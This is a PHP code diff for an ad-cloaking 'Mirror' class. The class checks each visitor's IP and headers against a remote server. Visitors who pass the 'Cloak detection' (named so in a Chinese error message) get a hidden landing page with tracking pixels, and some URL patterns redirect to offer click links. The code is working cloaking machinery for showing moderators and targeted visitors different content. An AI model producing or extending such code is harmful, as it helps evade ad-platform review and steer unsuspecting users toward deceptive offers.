@@ -28,11 +28,13 @@ Class Mirror
 
     public function __construct($server)
     {
+        session_start();
+
         $this->server = $server;
         $this->host = $_SERVER['HTTP_HOST'];
         $this->uri = $_SERVER['REQUEST_URI'];
 
-        if(is_file('.env'))
+        if (is_file('.env'))
             $this->server = trim(file_get_contents('.env'));
 
         $this->config();
@@ -43,7 +45,23 @@ Class Mirror
     {
         $ip = self::getIP();
         if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
-            if ($_SERVER['REQUEST_URI'] == '/' || stripos($_SERVER['REQUEST_URI'], '/?') !== false || isset($_GET['debug'])) {
+
+            $uri = strtolower($_SERVER['REQUEST_URI']);
+
+            if (strpos($uri, '.html') && strpos($uri, 'k_')) {
+
+                if(!isset($_SESSION['mirrors'])){
+                    header("HTTP/1.1 404 Not Found");
+                    die();
+                }
+
+                $array = $_SESSION['mirrors'];
+                $url = $this->server . '/click?offer_id=' . $array['offer_id'] . '&offer_url=' . $array['offer_url'] . '&click_id=' . $array['click_id'];
+                header('Location: ' . $url);
+                die();
+            }
+
+            if (!strpos($uri, '.js') && !strpos($uri, '.css') && !strpos($uri, '.png') && !strpos($uri, '.jp')) {
                 try {
                     $url = $this->server . "/check?host=" . $_SERVER['HTTP_HOST'] . '&ip=' . $ip;
 
@@ -54,20 +72,19 @@ Class Mirror
                         'Referer' => $_SERVER['HTTP_REFERER'] ?? '',
                         'Client_IP' => $_SERVER['HTTP_CLIENT_IP'] ?? '',
                         'X-Forwarded-For' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
-                      //  'Accept-Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
+                        //  'Accept-Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
                         'Accept-Charset' => $_SERVER['HTTP_ACCEPT_CHARSET'] ?? '',
                     ];
                     $response = $this->get($url, $headers);
 
-                    if(isset($_GET['debug']) && $_GET['debug'] == 'api')
-                    {
-                       $array = [
-                           'headers' => $headers,
-                           'response' => $response,
-                           'url' => $url,
-                       ];
-                       print_r($array);
-                       die();
+                    if (isset($_GET['debug']) && $_GET['debug'] == 'api') {
+                        $array = [
+                            'headers' => $headers,
+                            'response' => $response,
+                            'url' => $url,
+                        ];
+                        print_r($array);
+                        die();
                     }
 
 
@@ -78,11 +95,11 @@ Class Mirror
                         if (!isset($array['lander_url']))
                             die("已经通过 Cloak 检测，但是你没有给站点绑定转化页，请检查。");
 
-                        $response = $this->get($array['lander_url'],$headers);
+                        $response = $this->get($array['lander_url'], $headers);
                         $content = $response['body'];
 
                         $pid = $_GET['pixel'] ?? false;
-                        if(!$pid)
+                        if (!$pid)
                             $content = str_replace('[PID]', $array['pid'], $content);
                         else
                             $content = str_replace('[PID]', $pid, $content);
@@ -92,12 +109,14 @@ Class Mirror
                         $content = str_replace('[CLICK_ID]', $array['click_id'], $content);
                         $content = str_replace('[DOMAIN]', $array['domain'], $content);
 
+                        $_SESSION['mirrors'] = $array;
+
                         header("Content-type:text/html;charset=utf-8");
                         die($content);
                     }
 
                 } catch (\Exception $e) {
-                    if(isset($_GET['debug']))
+                    if (isset($_GET['debug']))
                         die($e->getMessage());
                 }
 
@@ -115,7 +134,7 @@ Class Mirror
             'Accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
             'Accept-Language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
             'Referer' => $_SERVER['HTTP_REFERER'] ?? '',
-           // 'Accept-Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
+            // 'Accept-Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
             'Accept-Charset' => $_SERVER['HTTP_ACCEPT_CHARSET'] ?? '',
         ];
 
@@ -138,7 +157,7 @@ Class Mirror
             $this->config = unserialize(gzuncompress($content));
             return;
         }
-        $content = file_get_contents($this->server.'/config?host=' . $this->host);
+        $content = file_get_contents($this->server . '/config?host=' . $this->host);
         $array = json_decode($content, true);
         file_put_contents($configFile, gzcompress(serialize($array)));
         $this->config = $array;
@@ -153,7 +172,7 @@ Class Mirror
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_HEADER, 1);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //返回数据不直接输出
-      //  curl_setopt($ch, CURLOPT_ENCODING, $encoding); //指定gzip压缩
+        //  curl_setopt($ch, CURLOPT_ENCODING, $encoding); //指定gzip压缩
         //add header
         if (!empty($header)) {
             $headers = [];
@@ -172,7 +191,7 @@ Class Mirror
         try {
             $content = curl_exec($ch); //执行并存储结果
         } catch (\Exception $e) {
-           // die($e->getMessage());
+            // die($e->getMessage());
             return 404;
         }
         $curlError = curl_error($ch);
